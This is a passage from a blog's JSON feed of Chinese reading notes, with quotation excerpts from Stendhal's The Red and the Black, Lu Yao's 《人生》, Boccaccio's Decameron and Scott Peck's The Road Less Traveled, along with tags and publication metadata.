            "content_html": "<p>她的灵魂像天使一般善良，而姿色更是天下少有。</p>\n<h3 id=\"3-84\"><a class=\"markdownIt-Anchor\" href=\"#3-84\">#</a> 3-84</h3>\n<p>权势、足以引起傻瓜的敬重，孩童的惊吒，阔佬的嫉妒，贤哲的轻蔑。</p>\n<p>事若如此，其罪在我？</p>\n<p>谁能猜到在这样的外貌之下竟藏着百折不挠的决心，哪怕九死一生，也要活出名堂来。他想离开纬立业，故乡的所见所闻使他深恶，心灰意冷。</p>\n<p>我已经不知道自己是谁，在做什么。</p>\n<p>我固然微不足道，夫人，但我并不低三下四。</p>\n<p>有钱人就是这样，他们得罪了人，以为只要装模作样一番，就什么都弥补过来了。</p>\n<p>处于我们的地位，就应该有所选择：不是追求尘世的富贵，就是向往天国的福祉。别无折中的办法。</p>\n<p>书中不仅有幸福与陶醉，也有失意时的慰藉。</p>\n<p>热情最会伪装，须知欲盖反而弥彰。有如乌云越黑，越是显示有可怕的风景。</p>\n<p>无疑，这是卑劣的灵魂所能表现出的最大的歉意了。</p>\n<p>而她的软弱，更加重了她的不幸。</p>\n<p>藏在这儿，世人就不会伤害到我了。在这里，周围的一切都不存在了。</p>\n<p>在上流社会的可悲现实中教养出来的年轻人，即使有丰富的想象力。也只会受到冷酷的嘲弄。伟大的行动，将随着不能现实的希望同归于尽。</p>\n<p>我有面包，我要自由！</p>\n<h3 id=\"3-85\"><a class=\"markdownIt-Anchor\" href=\"#3-85\">#</a> 3-85</h3>\n<p>他要选择的，不是善与恶。而是碌碌无为的安闲舒适，还是少年气盛的英雄美梦。</p>\n<p>小说，是一面镜子，鉴以照之，一路行去。</p>\n<p>他平时与人落落寡合，一味钻研在自己的猜想和猜疑中，也就远离了一切可以使他收益的机会。</p>\n<p>爱情起始于爱慕，终极于死亡。但在此面前，是无尽的怅惘，忧伤，悲泣，欺骗，罪恶。</p>\n<p>渴望已久的东西，一旦如愿以偿，心灵反而陷入惊讶的惶惑之中。人心本来就一直有所期望，现在已无可追求，而刚过眼的烟云，尚未成为甜蜜的回忆。</p>\n<p>她的灵魂像天使一般善良，而姿色更是天下少有。</p>\n<p>时至今日，野心一直是他生活的要义。</p>\n<p>不管怎样，有了这不可磨灭的回忆，教我们永远也快活不起来了。</p>\n<p>他的头脑，不至于被过去，如几千年的记载，名人的陈述所蒙蔽。</p>\n<p>难道你们只配像一具没有灵魂，没有热血的尸体，给扔在那里？</p>\n<p>日常发生的事，其奇奇怪怪的一面，往往掩盖了激情造成的真正不幸。</p>\n<p>担忧一去，重新堕入爱的疯狂，连带着又产生了致命的怀疑。</p>\n<p>不要太恣意调情，血液中的火焰一旦熊熊燃烧，最坚强的誓言也形同于草。</p>\n<p>这都是我们生性脆弱的缘故，不是我们自身的过错，因为上天造下我们是哪样的人，我们就是哪样的人。</p>\n<p>语言是给人用来掩盖思想的。</p>\n<p>你用肮脏的手段得到肮脏的钱，也只配在这种场合，跟这批狐群狗党一起享用。</p>\n<p>世间永远是不足之忧，永远是贫富之争。</p>\n<p>强烈的感情至为罕见，往往都是深藏不露的。</p>\n<p>他可以耽于辉煌的驰思，不至于时时刻刻给拉回到残酷的现实，强迫自己去探索卑劣的人心，再用虚伪的言行，行其欺诈的勾当。</p>\n<p>婚后生活的幽寂沉闷，足以使爱情荡然无存，如果婚前曾有爱情的话。</p>\n<h3 id=\"3-86\"><a class=\"markdownIt-Anchor\" href=\"#3-86\">#</a> 3-86</h3>\n<p>在相当富裕而无需劳作的家庭，婚姻很快会把安闲的享受变成深切的厌倦。</p>\n<p>一个人经过长途跋涉，刚爬上陡峭的山峰，坐在山顶休息片刻，自会觉得无比惬意。如果要一直坐下去，你还会觉得快活吗？</p>\n<p>生活之所以还过得去，因为在她与极端的不幸之间，还存在着一丝希望。</p>\n<p>笑脸不过时虚伪的舞台，对浮华的世界不能太动心。</p>\n<p>我可以用此世界的浮华语言和你交谈，因为红尘十丈，看来你已习染甚深。</p>\n<p>于连从他们死气沉沉的眼里，饭前只看到期待饱吃一顿的生理需要，饭后只看到口腹之欲满足之后的生理快感。</p>\n<p>事实上，他一生的大事，都是经过精心谋划的，只是他疏于细节，但总有一些狡黠之徒却专门注意琐碎小事。</p>\n<p>他染上了一个恶癖：用自己的头脑去思考，而不是盲从权威和先例。</p>\n<p>那时以为，这就是生活；其实，只是准备生活。现在，才算进入社会，发现周围布满了真正的敌人，这情形直要到我的角色扮完为止。</p>\n<p>我唯一的长处，是进步快，有法于掌握那些无聊玩意。</p>\n<p>不信空话的习惯也许是好习惯，但它会自取其咎，须知自作解人，便会得罪庸众。</p>\n<p>这一切原本就是丑恶的，唯有意图越真，才越丑恶。</p>\n<p>你想得到不盘问你的人，真正的乐趣，或许在于能加害于你。</p>\n<p>庸碌之辈，财迷心窍，是不可能了解彼此。神甫正是从信仰中获取到必要的力量，才能够六年来孤军奋斗，对抗他的敌人。</p>\n<p>你如果注定要堕落，那就立刻堕落吧。</p>\n<p>思想活泼一点，就被认为是粗俗不堪。尽管谈吐高雅，礼貌周全，力求取悦于人，但每张脸上都能看出无聊的表情。</p>\n<p>他对什么都感兴趣，无论是事情的本身，还是取笑的方式。</p>\n<p>听惯了平淡无奇的话，一旦听到稍微活波一点的想法就会被视为粗野。</p>\n<h3 id=\"3-87\"><a class=\"markdownIt-Anchor\" href=\"#3-87\">#</a> 3-87</h3>\n<p>身处上流社会，周旋进退，自由一套绝妙的礼仪，但这礼仪又因地位不同而极有分寸，极有差筹 — 在礼的仪制下，导致情的枯索。</p>\n<p>他的容貌，高贵而空虚，反映出他思想的合宜与空泛。</p>\n<p>人家的期待如斯，你就要做与之相反的事。我敢保证，这是当代的唯一信条。</p>\n<p>每天发一个钟头神经的人，才是最清醒的人；而这最清醒的人，又为自杀的恶魔所缠绕。自杀魔王，是这个国家的神灵。</p>\n<p>出身高贵，会销蚀一个人舍身求法的美德。</p>\n<p>我在这里见到了什么？不是飞扬浮躁的虚荣心，便是差筹不同的自尊心，此外就什么也没有。</p>\n<p>组成我生活的，不过是一连串的伪诈，就因为缺少借以糊口的一千法郎。</p>\n<p>展望未来，她并不恐惧 — 恐惧倒是一种强烈的情感，而是厌恶，一种在她这年纪却忽少见的厌恶。</p>\n<p>崖断云连的谈话，不期而遇的相会，对富于想象的人，都是彰显较著的印证，只要他心里还剩有一点热情的火焰。</p>\n<p>在人生这片自私的沙漠里，人名为己，人人都是在为自己打算。</p>\n<p>但是，要是按兵不动，日后我必定会瞧不起自己。是祸是福，我会翻来翻去猜测一辈子，而疑疑惑惑，对我是最大的痛苦。</p>\n<p>既然他已决定赴汤蹈火，暂时耽于这种怯弱的情绪，又有什么可不好意思的。只要到行动的时刻，提得起勇气就行。</p>\n<p>他这辈子还没这样害怕过：只因看到此举的风险，了无赴约的热枕。</p>\n<p>这非走不可的一步，对她来说是多么残酷；要是可能，她愿用毕生的不幸去赎取回来。</p>\n<p>高超的思想想倦了，有时也会惋惜在他身上觅得的幸福瞬间，只是忆及往事，心中不能无悔，在某些时刻，甚至感到抬不起头来。</p>\n<h3 id=\"3-88\"><a class=\"markdownIt-Anchor\" href=\"#3-88\">#</a> 3-88</h3>\n<p>理智的爱，无疑比情感的爱更清醒；这种爱，只有片刻的狂热，因为太了解自身，不断的自我审判，因为是观念的产物，所以不会晕头转向。</p>\n<p>我这个人平平庸庸，别人觉得可厌，自己也觉得可鄙。在神经错乱的情况下，他还试图用一己的想法来评判人生大事！这正是聪明人常犯的错误。</p>\n<p>可怕的猜疑，无言的错愕，还有失望的情绪，相继在他心中萦回。</p>\n<p>今天什么也不做，什么也不说，精神像肉体一样死去才好。</p>\n<p>游寄终日，实际上是把他自己的命运托诸渺茫难凭的偶然。</p>\n<p>盲目的本能驱使他把决定命运的关键时刻尽量往后推。他觉得只要话还在说下去，事情就还没有完。但他说的话，她根本没听。</p>\n<p>啊，共和国！今天，肯为公众利益牺牲一切的只有一个人，而图享受虚荣的，却何止千千万万。在巴黎，一个人只受尊重，是看他的车马，而不是他的品德。</p>\n<p>她眼睛看到的只有她自己，而不是你，所以，她对你并不了解。</p>\n<p>所抄的东西，荒唐的可以，以致到后来，就逐句照抄，不问其意义如何了。</p>\n<p>谈虚无，谈死亡，谈无穷，都是要言妙道，但究其实，只是一种怕人耻笑的恐惧心理而已。好像无所不谈，实际上言之无物。</p>\n<p>她的周围都是道德君子，但更多的是浅薄时代的印记。</p>\n<p>他对她讲的，没有一句不是谎言，至少是真实想法的恶劣伪装。</p>\n<p>这就是当代文明的奇观！你们把神圣的爱情当成了寻常事一桩。</p>\n<p>障碍不是来自您的社会地位，不幸的是来自你的性格。</p>\n<p>这个世界里，一切都乱了，我们正在走向乱世。</p>\n<p>他的一生，不过是为大不幸做准备的漫长过程，当然不排除被人生视为最大不幸的死。</p>\n<p>他看着于连，他好像有点懵然不觉的样子。从前那张神采奕奕生气勃勃的脸，显耀出人类最高尚的情感，而今吃顿麻木竟至于此。</p>\n<h3 id=\"3-89\"><a class=\"markdownIt-Anchor\" href=\"#3-89\">#</a> 3-89</h3>\n<p>他刚跟死亡打了个照面，看到了其全部的丑恶形状。伟大的心灵，慷慨的胸怀，这些绚丽的幻象，像彩云遇到风暴，都消逝得无影无踪。</p>\n<p>正因为我那时疯疯癫癫，所以今天才这样规矩行不。只能看到瞬间事物的哲人，目光是何等短浅，那你的眼睛就看不到在暗中涌动的激情。</p>\n<p>你们那些明争暗斗，家长里短，我觉得我不堪其扰，会把我从半空中拉回来，各有各的死法，我呢，要按我自己的方式去设想死。</p>\n<p>看来，我命中注定是会在梦想中死去。像我这样一个无名之辈，不出半个月，就会给人忘得一干二净，何苦去演什么戏呢….</p>\n<p>一种具有远大抱负的坚毅性格，自能支配凡夫俗子的粗鄙头脑。</p>\n<p>谁知道他世界是怎么个情景？也许是磨难，也许是空荡荡一片太虚。</p>\n<p>我眼下是懦夫一个，但却无人知晓，无人知晓。</p>\n<p>世界上根本就没什么天然法纪，这个词儿不过是古代传下来的无稽之谈。有立法之前，合乎天然的，只有狮子的雄力和饿汉的需要。</p>\n<p>受人尊敬的人物，不过是作案时幸而没被当场抓获的骗子罢了。</p>\n<p>不论是现实生活，还是幻想世界，竟无一当意者。缺乏活动，开始损及他的健康，他变得激切又很虚弱。他已缺失男子概威风；这种男子汉气概，就是大喝一声，能把不合时宜的恼人想法推开。</p>\n<p>我爱真理…… 但真理又在哪里？…… 到处都是尔虞我诈，至少是招摇撞骗，连最有德行的人，最伟大的人，也不能免俗。</p>\n<p>活在世上的时候，我并不孤单，我对人生的职责，有极强的识见…… 我为自己规定的职责，不论对错…… 就像暴风雨中可以依傍的大树，我有过动摇，受过颠簸。总之我也是一个人…… 但我并没有被风暴卷走。</p>\n<p>一种狂暴而又无法报复的妒忌，一种持续而又无望的厄运，一种眼见情人薄幸而又受得更深的羞愧与痛彻，使拉穆尔小姐终日闷默。</p>\n<h3 id=\"3-90\"><a class=\"markdownIt-Anchor\" href=\"#3-90\">#</a> 3-90</h3>\n<p>我本可以感到非常幸福的，但是我那野心把我的魂引向了虚无缥缈之境。</p>\n<p>我要是连自己都看不起自己，那我这个人还剩下什么呢？我曾经很有抱负，我不愿糟蹋自己；我那时的行为，是照那时的世风时尚。眼下我只能活一天算一天，得过且过。总之，时刻如今再做出什么低三下四的事来，我会不胜痛惜的。</p>\n<p>但在于连死后三天，她搂着自己的孩子，离开了人间。</p>\n",
            "tags": [
                "爱情",
                "人性",
                "道德"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/31%E3%80%8A%E4%BA%BA%E7%94%9F%E3%80%8B%E8%B7%AF%E9%81%A5/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/31%E3%80%8A%E4%BA%BA%E7%94%9F%E3%80%8B%E8%B7%AF%E9%81%A5/",
            "title": "《人生》路遥",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>一边吸烟，一边胡思乱想。他觉得他想了许多问题，又觉得他什么也没想。</p>\n<h3 id=\"3-82\"><a class=\"markdownIt-Anchor\" href=\"#3-82\">#</a> 3-82</h3>\n<p>从小在山野乡间长大让她对世事无常的得意失意没有过多计较和苛求，往往是一些自命不凡、自负清高的文化人才对生活百般挑剔。</p>\n<p>人生，其实无非是矛盾与选择的综合体，无关对错，仅仅在于我们能否有勇气在矛盾中作出选择并勇敢承担一切后果。</p>\n<p>但这一切是毫无办法的。严峻的生活把他赶上了这条尘土飞扬的路，他不得不承认，他现在只能这样开始新的生活。</p>\n<p>而他，却不得不在这尘土飞扬的市场上颠簸着为几个钱受委屈。</p>\n<p>我一开始就想把最苦的都尝个遍，以后就什么苦活也不怕了。</p>\n<p>他以前只是在小说里感到过它的魅力，现在这一切，他都全部真实的体验到了，而最宝贵的是，他的幸福正是在他不幸的时候到来的。</p>\n<p>当爱情在一个青年人身上第一次苏醒以后，它会转变为一种巨大的能量，甚至对生活完全丧失信心的人，热烈的爱情也可能使他的精神重新闪闪发光。</p>\n<p>美丽的憧憬和幻想，常使他短暂地忘记了疲劳与不愉快；黑暗中他微微咧开嘴巴，惊喜的用眼睛和耳朵仔细搜索起远方的声音来。听着听着，他又觉得他什么都没听见；才知道这只不过是他的一种幻觉罢了。</p>\n<p>劳动啊，它是艰苦的，但也有它本身的快乐。</p>\n<p>当时的痛苦对这样一个向往很高的青年人来说，是可想而知的，也是可以理解的。但这并不是通常人们说的那个命运摆布人。国家目前正处于困难时期，不可能满足所有公民的愿望和要求。</p>\n<h3 id=\"3-83\"><a class=\"markdownIt-Anchor\" href=\"#3-83\">#</a> 3-83</h3>\n<p>现实生活中有很多这样的人，他们为了个人的利益。又是毫不顾忌的给这些徘徊在生活十字路口的人当头一棒，使他们的生活更加悲观；有时，还是出于个人目的，他们又一下子把这些人推到生活的顺风船上了。</p>\n<p>一边吸烟，一边胡思乱想。他觉得他想了许多问题，又觉得他什么也没想。</p>\n<p>他非常熟悉，一眼就能看到底。他认为她们是单纯的，也往往是单调的。</p>\n<p>生活，有时候把现实变成了梦想，有时候又把梦想变成了现实。</p>\n<p>不管到什么时候，咱为人的老根本不能丢啊。</p>\n<p>她仍和往常一样，该做什么，就做什么。她既没有寻短见，也没有精神失常；人生的灾难打倒了他，但他又从地上爬起来了。</p>\n<p>她曾想过死，但她不能。她应该活下去，她要在土地上寻找别的地方找不到的东西。她现在只能接受现实对她的宣判，老实的按自己的条件生活。</p>\n<p>生活总是这样，不能叫人相处都满意。但我们还要热情的活下去。人活一生，值得爱的东西很多，不要因为一个方面不满意就灰心。</p>\n<p>生活的变化如同闪电一般迅疾；她刚刚开始了愉快，马上又陷入了痛苦！生活对于她这样的人总是无情的。如果她不确立和坚定自己的生活原则，生活就会不断地给她提出这样严峻的问题，让她选择。</p>\n<p>他们仍然应该回到各自原来的位置上。他尽管是个理想主义者，但在具体问题上又很现实。</p>\n<p>现实是不能以个人的意志为转移的。谁如果离开自己的现实，就等于要离开地球。一个人应该有理想，甚至应该有幻想，但他千万不能抛开现实生活，去盲目追求实际上还不能得到的东西。</p>\n<p>他不知道自己从什么路上走来，又向什么路上走去……</p>\n<p>他的悲剧是他自己造成的！他为了虚荣而抛弃了生活的原则，落了今天这个下场！他渐渐明白，如果他就这样下去，他躲过了生活的这一次惩罚，也躲不过去下一次惩罚 — 那时候，他也许就被彻底毁灭了。</p>\n<h3 id=\"3-84\"><a class=\"markdownIt-Anchor\" href=\"#3-84\">#</a> 3-84</h3>\n<p>一切都是原来的样子 — 但对他来说，一切又都不一样了。</p>\n<p>就是这山，这水，这土地，一代一代养活了我们。没有这土地，世界上什么也不会有！只要咱们爱劳动，一切都还会好起来的。</p>\n<p>好好重新开始活你的人吧。</p>\n",
            "tags": [
                "人生",
                "命运"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/25%E3%80%8A%E5%8D%81%E6%97%A5%E8%B0%88%E3%80%8B%E8%96%84%E4%BC%BD%E4%B8%98/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/25%E3%80%8A%E5%8D%81%E6%97%A5%E8%B0%88%E3%80%8B%E8%96%84%E4%BC%BD%E4%B8%98/",
            "title": "《十日谈》薄伽丘",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>他们无一例外，个个都是贪图口腹之欲的酒囊饭袋，那种狼吞虎咽，活像是头野兽。他们首先是色中饿鬼，其次就好算得是肚子的奴隶了。</p>\n<h3 id=\"3-47\"><a class=\"markdownIt-Anchor\" href=\"#3-47\">#</a> 3-47</h3>\n<p>废除作为人民幻想的幸福的宗教，也就是要求实现人民的现实的幸福。</p>\n<p>天主教会和蒙昧主义是相依为命的。只有使人们陷入浑浑噩噩、丧失辨别思考的能力，把教会所编造的谎话句句都当作真理般信仰、盲从，它才能以至高无上的神的名义骑在人民头上任意作威作福。</p>\n<p>为了给陷于极端贫困的劳动人民套上沉重的精神枷锁，使他们丧失斗争的意志，永远甘心于被剥削，被压迫的命运，天主教会利用一切宣传手段，要人们相信，人世就是罪恶的深渊，是苦海；为了未来的天国幸福，就必须忍饥挨饿，禁欲苦修，摒弃现实生活中的一切享受。</p>\n<p>可是这份爱情却终于给流水般的时光冲淡了，到现在我的灵魂里只剩下了欢乐的追念 — 这是爱情赐给那些不曾在爱河里灭顶的人的礼物。我这场恋爱，当初叫我遭受许多痛苦，现在痛苦解脱了，只剩下欢乐的回忆。</p>\n<p>不仅是世俗的人们，就连隐居到修道院里的修士，也认为别人公然做得事，他们同样做得，因此竟违背了誓愿和清规，去追求那肉体的欢乐。这样，为了想逃过这场灾祸，人们变得荒淫无度了。</p>\n<p>他还看透他们无一例外，个个都是贪图口腹之欲的酒囊饭袋，那种狼吞虎咽，活像是头野兽。他们首先是色中饿鬼，其次就好算得是肚子的奴隶了。</p>\n<p>愚蠢往往使得人们从幸福的境界堕入苦痛万分的深渊，而聪明人却往往能凭着智慧，安然渡过险境，走向康庄大道。有些人本来可以快快乐乐过日子，只因为愚蠢，弄得整天愁眉苦脸。</p>\n",
            "tags": [
                "意义",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/2%E3%80%8A%E5%B0%91%E6%9C%89%E4%BA%BA%E8%B5%B0%E7%9A%84%E8%B7%AF%E3%80%8B%E6%96%AF%E7%A7%91%E7%89%B9%C2%B7%E6%B4%BE%E5%85%8B/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/2%E3%80%8A%E5%B0%91%E6%9C%89%E4%BA%BA%E8%B5%B0%E7%9A%84%E8%B7%AF%E3%80%8B%E6%96%AF%E7%A7%91%E7%89%B9%C2%B7%E6%B4%BE%E5%85%8B/",
            "title": "《少有人走的路》斯科特·派克",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>乔治，我基本可以肯定，你其实是一个懦夫。你每次遇到问题和痛苦，都不敢去正视，只知道用谎言欺骗自己。你不愿采取行动，甚至连想都不愿去想，只会选择逃避。</p>\n<h3 id=\"2-58\"><a class=\"markdownIt-Anchor\" href=\"#2-58\">#</a> 2-58</h3>\n<p>几乎人人都有心理问题，只不过程度不同而已；几乎人人都有程度不同的心理疾病，只不过得病的时间不同而已。</p>\n<p>人生是一个不断面对问题，并解决问题的过程。问题可以开始我们的智慧，激发我们的勇气。智慧的人不会因害怕痛苦而逃避问题，他们会迎上前去，坦然承受问题带给自己的痛苦，直至把问题彻底解决。</p>\n<p>在一定程度上，几乎人人都有害怕承受痛苦的倾向，几乎人人遇到问题都有回避的想法。有的人不断拖延时间，希望问题自相消失，有的人对问题假装视而不见，或尽量忘记他们的存在，还有人用药物和毒品来麻痹自己，企图把问题排除在意识之外，换得片刻解脱。</p>\n<h3 id=\"2-59\"><a class=\"markdownIt-Anchor\" href=\"#2-59\">#</a> 2-59</h3>\n<p>有的逃避问题者，作茧自缚躲藏在自己营造的幻想世界里，与现实完全脱节。替代品最终带给人的痛苦，甚至比逃避的痛苦更加剧烈。事实上，如果不顾一切逃避问题和痛苦，不仅错失了问题带来的成长机会，而且还会使我们换上很严重的心理疾病。</p>\n<p>所谓规矩，就是一套教人承受痛苦，解决问题的办法。这套办法完整而积极，它能让我们勇敢地去面对人生的苦难，而不会逃避退缩。这套规则一共有四条：先苦后甜、承担责任、忠于事实，保持平衡。</p>\n<p>如果我们认为自己很有价值，就会认为我们的时间也很有价值，如此有价值的是时间必须要加以善用。他们不会只贪图一时的安逸，牺牲掉长期的幸福，而是甘愿以某种方式推迟暂时的满足感。</p>\n<p>一厢情愿的等待问题自行消失，是更为可怕的事情。</p>\n<p>问题没有消失，它仍然继续存在，仍然妨碍着心灵的成长。</p>\n<p>只有解决了忽视问题这一问题，才能继续解决其它问题。</p>\n<p>军队最大的问题在任何组织和机构中同样存在，那就是绝大多数指挥官智慧呆呆坐在办公室里，眼睛盯着大堆问题，迟迟无法做出决定，更谈不上实际行动，似乎盯上几天几夜，问题就会自行消失一样。</p>\n<p>问题拖的越久，就越是积难重返，解决起来更加艰难了。</p>\n<p>他根本不接受帮助，他的固执让我不能为力。</p>\n<p>神经官能症患为自己强加责任，人格失调症患者不愿意承担原本自己的责任。</p>\n<p>神经官能症患者让自己活得痛苦，人格失调症让别人活的痛苦。</p>\n<p>如果不去直面问题，解决问题，问题就永远存在。不能解决问题，你就会成为问题。</p>\n<p>我的时间安排是我的责任，只有我自己才能承担。为了多开责任带来的痛苦，数不清的人甘愿放弃权力，实则是在逃避自由。</p>\n<p>幼小的孩子依赖父母，当然情有可原，如果父母独断专行，孩子也没有选择的余地。头脑清醒的成年人则可不受限制，做出适合自己的选择。我相信世界上存在压迫性的力量，可是我们有足够的自由与之对抗。</p>\n<p>他们都面临一个共同的问题–感觉自己不能够应付或者改变现状，因此产生恐惧，无助感和自我怀疑。大多数患者力不从心的根源，在于他们总想逃避自由，不去为自己的问题，自己的生活承担责任。他们感到乏力，因为他们放弃了自己的力量。</p>\n<p>我们越是了解事实，处理问题就越是得心应手，对事实了解的越少，思维就越混乱。错觉和混乱只会见我们不知所措。绘制人生地图的艰难，不在于我们需要从头开始，而在于需要不断修正。</p>\n<p>一旦新的信息与过去的观念发生冲突，需要对地图大幅度修正，我们就会感到恐惧，宁可对新的信息视而不见。我们的态度也变得相当奇特–不仅抗拒新的信息，甚至指责新的信息混淆是非，说他们是异端邪说。</p>\n<p>抱着残缺的人生地图不放，与现实世界处处脱节，这是不少人的通病。</p>\n<p>逃避现实的痛苦是人类的天性，只有遵循规矩，我们才能逐渐克服现实的痛苦。我们必须忠于事实，尽管这会带来暂时的痛苦，但远比沉湎于虚假的生活中要好。我们必须忍受暂时的不适感，追求事实而非假象。</p>\n<p>自我反省对于我们的生存至关重要。反省内心世界带来的痛苦，往往大于观察外在世界带来的痛苦，所以很多人逃避前者而选择后者。</p>\n<p>不管现实如何变化，我们都有自我调节的能力。逃避挑战是人的本能，但不意味着它是恰当的，也不意味着我们无法作出改变。人之为人，或许就在于我们可以改变本性，超越本性。</p>\n<p>由于对别人撒谎，良知会提醒我们，这使我们感到痛苦，为了逃避这种痛苦，人们便会对自己撒谎。违背良知而自欺欺人，由此产生的谎言不可胜数。</p>\n<h3 id=\"2-61\"><a class=\"markdownIt-Anchor\" href=\"#2-61\">#</a> 2-61</h3>\n<p>长时间的自欺欺人，使人的愧疚积聚，机会导致心理疾病。</p>\n<p>黑色谎言，就是彻头彻尾的谎言，叙述的情况与现实完全不符，白色谎言，其本身或许就能反映事实，却有意隐藏大部分真相。白色谎言的头衔并不意味着值得被原谅。政府利用审查制度使人们无法了解真相，就是一种白色谎言，通过这种白色谎言欺骗民众的政府，并不比直接撒谎的政府更加民主开明。</p>\n<p>父母的白色谎言不是对孩子的保护，而是对孩子权利的剥夺，让他们无法了解到有关金钱、疾病、毒品、性、婚姻、父母、祖父母及其他方面的真实情形。他们接触的不是角色榜样，而是掩饰，隐瞒和怯懦。</p>\n<p>他们不需要掩饰过去的假象，不必编造更多的谎言来掩盖过去的谎言。一个人越是成熟，保持成熟就越是容易，而谎言说得越多，则要编造更多的谎言自圆其说。</p>\n<p>有时候，即便他们果真有意而为，我们也要适当的约束情绪，因为正面冲突只会是使处境更加不利。大脑的高级中枢–判断力，必须约束低级中枢–情绪。这个复杂多变的世界里，我们不但要有生气的能力，还有有具备客气的能力。</p>\n<p>我想不管是谁，经过人生旅途的急转弯时，都必须放弃某些快乐，放弃属于自己的某一部分。除非永远停留在原地，否则这样的放弃是不可避免的。放弃固有的人格，根深蒂固的意识形态和行为模式，甚至整个人生理念，其痛苦之大可想而知。</p>\n<p>只有放弃旧的过时的观念和习惯，才能度过危机，顺利进入人生的下一阶段。不少人不敢面对现实，或者无法放弃早已过时的东西，所以无法克服精神的危机，只能止步不前。在人生过程中必须放弃的生活环境、个人欲望和处世态度。</p>\n<p>不管我们怎么努力，人生的努力都会荡然无存。生命的意义在于死亡之中，这个秘密是一切宗教的核心。</p>\n<p>耶稣在十字架上舍生取义的痛苦，和释迦摩尼在菩提树下涅槃的幸福，本质上并没有不同。</p>\n<h3 id=\"2-62\"><a class=\"markdownIt-Anchor\" href=\"#2-62\">#</a> 2-62</h3>\n<p>要放弃某事物，首先必须拥有他。你不可能放弃从来没有过的事物，同样的，首先要确立自我，才能放弃自我。</p>\n<p>爱是为了促进自己和他人心智成熟，而不断拓展自我界限的一种意愿。</p>\n<p>爱与不爱最显著的区别之一，就在于当事人的意识和潜意识中的目标是否一致。如果不一致，就不是真正的爱。</p>\n<p>我们最终会意识到，爱自己与爱他人，其实是并行不悖的两条轨道，随着时间的推进，两者不但越来越近，其界限甚至会模糊不清乃至完全泯灭。</p>\n<p>爱是不断扩展自我界限的过程，所以，爱意味着我们要不断付出努力，以拓展彼此的自我界限。爱是一种意愿，与意愿有所区别。并不使所有的欲望都能够转化为行动，而只有强大到足以转化成行动的欲望，才能称为意愿。</p>\n<p>对于他们而言，自我界限是一把保护伞，孤独和寂寞反而能带来安全感。</p>\n<p>坠入情网并不是自我界限的扩展，而是自我界限某一部分暂时性的崩溃。扩展自我界限需要付出足够的努力，坠入情网却无需努力。当最初的激情终结时，自我界限必然恢复原状，留下的只有失落和幻灭。</p>\n<p>这种错觉让我们一辈子痛苦。</p>\n<p>浪漫的爱情神话不过是一种可怕的谎言。</p>\n<p>没有别人就无法生存，意味着你是个寄生者，而对方是寄虫。真正相爱的人，不一定非要生活在一起，只是选择生活在一起罢了。他们的情感关系貌似坚固，实则脆弱，因为他们构建情感的目的，只是为填补内心的空虚，为此，甚至是来者不拒。</p>\n<p>他们每每生活在失望和沮丧中，但却认为是别人没有尽心尽力。一味依赖别人，是最糟糕的活法。与其依赖别人，不如依赖毒品呢！必经，只要后者货源充足，起码会让你在相当长的时间里，生活在如痴如醉的状态之中。</p>\n<p>爱绝对不是无原则的接受，也包括必要的冲突，果断的拒绝和严厉的批评。</p>\n<p>受虐狂者把忍受虐待视为真正的爱，然而她们寻求抱负快感的前提和忍受虐待的动机，是来自恨而不是爱。在精神病理学上，纯粹的性虐待和被虐待现象极为罕见，更多的是社会性虐待狂和受虐狂，其危害也更为严重。患者在与性有关的人际交往中，总想不停地伤害对方，或被对方所伤害。</p>\n<h3 id=\"2-63\"><a class=\"markdownIt-Anchor\" href=\"#2-63\">#</a> 2-63</h3>\n<p>真正的爱是自主的选择，无论爱的感觉是否存在，都要奉献出情感和智慧。真正的爱不是忘乎所以，而是深思熟虑，是奉献全部身心的重大决定。其价值在于始终如一的行动，这远远大于转瞬即逝的感觉或者精神支柱。出自自我意愿，只能依靠实际行动来证明。爱是行动，不是空想。</p>\n<p>扩展自我界限，意味着摆脱惰性，直面内心的恐惧。</p>\n<p>如果用现代心理分析工具去分析每个人爱的意愿，我们就会发现，爱的意愿其实是一种关怀。为了完成意愿所需要的努力，就是对关怀的努力，也就是努力去关怀。</p>\n<p>勇气并不意味着永不恐惧，而是面对恐惧时能够坦然行动，大步走向未知的未来。</p>\n<p>她宁可让自己越来越萎缩，哪怕缩得像影子一样。完整的人生势必伴随着痛苦，如果想避免其中的痛苦，恐怕只有完全脱离现实，去过没有任何意义的生活。</p>\n<p>人生唯一的安全感，来自充分体验人生的不安全感。</p>\n<p>尊重自我的个性与愿望，敢于冒险进入未知领域，才能够活得自由自在。我们成家立业，生儿育女，绝非仅仅是为了满足他人的愿望。至高境界的爱，必然是自由状态下的自由选择，而不是墨守成规，被动而消极地抗拒心灵耳朵呼唤。</p>\n<p>假如我们生来就缺乏安全感，不仅时刻担心遭到遗弃，而且感觉前途渺茫，心智就永远不可能成熟，如果没有解决方案，甚至将问题扩大化，整天活在猜疑、恐惧的阴影中，就无法平心静气和找到出路，最终会使情感关系归于毁灭。</p>\n<p>大多数的批评只是出于一时的冲动，不满和愤怒，不但没有启发和教育意义，反而会使局面更加混乱。</p>\n<h3 id=\"2-64\"><a class=\"markdownIt-Anchor\" href=\"#2-64\">#</a> 2-64</h3>\n<p>真正有爱的人，绝不会随意指责爱的对象，竭力避免给对方造成傲慢的印象。刻骨铭心的情谊，会承认对方是与自己不同的、完全独立的个体。</p>\n<p>” 我看清问题的本质了吗？“，” 我发现问题的症结，还是出于模模糊糊的假想？“，” 我是否真正了解我所爱的人 “，” 